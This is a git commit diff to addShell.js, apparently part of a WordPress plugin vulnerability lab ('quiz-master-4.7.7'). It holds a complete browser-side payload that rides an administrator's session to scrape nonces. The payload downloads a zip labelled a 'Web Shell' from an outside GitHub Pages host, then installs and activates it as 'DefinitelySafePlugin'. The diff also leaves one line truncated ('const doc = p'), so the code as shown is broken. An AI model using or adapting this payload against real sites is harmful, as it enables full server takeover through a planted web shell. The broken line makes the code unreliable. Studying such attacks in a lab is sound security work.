499dca32da08641c8675e766beea6e6d7282906e
Arian <97740803+arian-lrd@users.noreply.github.com>
2025-04-20 04:34:09 -0400

    Update addShell.js

--- quiz-master-4.7.7/addShell.js
+++ quiz-master-4.7.7/addShell.js
@@ -1,37 +1,42 @@
 function addPlugin() {
     const pluginName = "DefinitelySafePlugin";
 
-    // 1- fetch the plugin-installation wpnonce
+    // STAGE 1- fetch the plugin-installation wpnonce
     fetch("http://localhost:8000/wp-admin/plugin-install.php", {
         credentials: "include",
     })
     .then(res => res.text())
     .then(html => {
+        // Parse the page
         const parser = new DOMParser();
         const doc = parser.parseFromString(html, 'text/html');
 
+        // Extract the installation wpnonce
         const nonceContainer = doc.querySelector("form.wp-upload-form[action*='upload-plugin'] input[type='hidden']#_wpnonce[name='_wpnonce']");
         const installation_wpNonce = nonceContainer?.getAttribute("value");
 
+        // Error if nonce wasn't found
         if (!installation_wpNonce) {
-            console.warn("Plugin addition nonce not found");
+            console.warn("Plugin installation nonce not found");
             return;
         }
 
-        // 2 - install the plugin
+        // STAGE 2 - install the plugin
         const zipUrl = `https://arian-lrd.github.io/public-resources/quiz-master-4.7.7/${pluginName}.zip`;
-        //const zipUrl = `https://owasp.arianamiri.com/${pluginName}.zip`
 
+        // Fetch the plugin's zip file
         fetch(zipUrl)
         .then(r => r.blob())
         .then(zipBlob => {
             console.log(`Web Shell ${pluginName} retrieved successfully`);
 
+            // Create thep plugin installation Form
             const form = new FormData();
             form.append('_wpnonce', installation_wpNonce);
             form.append('pluginzip', zipBlob, `${pluginName}.zip`);
             form.append('install-plugin-submit', 'Install Now');
 
+            // Imitate the form's POST to install the plugin
             return fetch("http://localhost:8000/wp-admin/update.php?action=upload-plugin", {
                 credentials: 'include',
                 method: 'POST',
@@ -41,7 +46,7 @@ function addPlugin() {
         .then(() => {
             console.log(`${pluginName} was installed successfully`);
 
-            // 3 - fetch the activation nonce
+            // STAGE 3 - fetch the activation nonce
             return fetch("http://localhost:8000/wp-admin/plugins.php", {
                 credentials: 'include'
             });
@@ -49,17 +54,19 @@ function addPlugin() {
         .then(res => res.text())
         .then(html => {
             const parser = new DOMParser();
-            const doc = parser.parseFromString(html, 'text/html');
-
+            const doc = p
+            
+            // Retrieve the activation wpnonce
             const nonceContainer = doc.querySelector(`tr[data-plugin='${pluginName}/${pluginName}.php'] td span a`);
             const activation_wpNonce = nonceContainer?.getAttribute("href").split('_wpnonce=')[1]?.substring(0, 10);
 
+            // Error if activation wpnonce not found
             if (!activation_wpNonce) {
                 console.warn(`Activation nonce for ${pluginName} not found`);
                 return;
             }
 
-            // 4 - Activate the plugin
+            // STAGE 4 - Activate the plugin
             return fetch(`http://localhost:8000/wp-admin/plugins.php?action=activate&plugin=${pluginName}%2F${pluginName}.php&_wpnonce=${activation_wpNonce}`, {
                 credentials: 'include'
             });
@@ -70,5 +77,5 @@ function addPlugin() {
     });
 }
 
+// execute the function
 addPlugin();
-
